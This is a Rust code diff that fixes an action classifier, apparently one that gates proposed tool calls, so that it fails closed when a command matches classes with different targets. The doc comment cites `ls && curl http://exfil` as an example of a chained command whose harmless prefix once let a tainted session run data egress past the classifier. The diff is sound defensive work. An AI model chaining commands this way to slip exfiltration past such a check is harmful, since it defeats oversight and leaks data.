@@ -189,13 +189,34 @@ impl CompiledWorld {
             .unwrap_or(false)
     }
 
-    /// Resolve the **effective action** for a proposed call (DECISIONS D36): for
-    /// the first classifier declared for `action`, read `arguments[arg]` as a
-    /// string and return the first class's `to` whose any pattern matches at a
-    /// left word boundary. If no class matches, or the command argument is
-    /// missing/malformed, `default_to` is used when the classifier declares one.
-    /// Actions without a classifier resolve to the raw action. Classification
-    /// is pure world data; no adapter may carry its own copy.
+    /// Resolve the **effective action** for a proposed call (DECISIONS D36, D63):
+    /// for the classifier declared for `action`, read `arguments[arg]` as a string
+    /// and return the `to` of the single class whose patterns match it at a left
+    /// word boundary.
+    ///
+    /// **Declaration order does not decide a verdict** (finding #17). Every class is
+    /// evaluated, not just up to the first hit, and the outcome is:
+    ///
+    /// | classes matching | effective action |
+    /// |---|---|
+    /// | exactly one target | that class's `to` |
+    /// | none | `default_to` |
+    /// | two or more different targets | `default_to` — the command is ambiguous |
+    ///
+    /// Returning the first match let ordering defeat the taint floor: a world
+    /// listing a permissive class before a restrictive one classified
+    /// `ls && curl http://exfil` by its `ls` prefix, so a tainted session was
+    /// allowed to run egress. A command line that looks like two different things
+    /// *is* two different things, and the honest answer is the classifier's own
+    /// fail-closed bucket rather than whichever entry the author happened to type
+    /// first.
+    ///
+    /// Ambiguity has somewhere safe to go because `default_to` is mandatory (D62);
+    /// the two findings are fixed by each other. Several classes pointing at the
+    /// *same* target is not ambiguity and resolves normally.
+    ///
+    /// Actions without a classifier resolve to the raw action. Classification is
+    /// pure world data; no adapter may carry its own copy.
     pub fn classify_command(
         &self,
         action: &ActionName,
@@ -213,12 +234,20 @@ impl CompiledWorld {
         let Some(cmd) = arguments.get(&def.arg).and_then(|c| c.as_str()) else {
             return fallback();
         };
+        let mut matched: Option<&ActionName> = None;
         for class in &def.classes {
-            if class.patterns.iter().any(|p| left_word_match(cmd, p)) {
-                return class.to.clone();
+            if !class.patterns.iter().any(|p| left_word_match(cmd, p)) {
+                continue;
+            }
+            match matched {
+                None => matched = Some(&class.to),
+                // The same target claimed twice is one answer, not a conflict.
+                Some(prev) if prev == &class.to => {}
+                // Two classes disagree about what this command is: fail closed.
+                Some(_) => return fallback(),
             }
         }
-        fallback()
+        matched.cloned().unwrap_or_else(fallback)
     }
 }
 
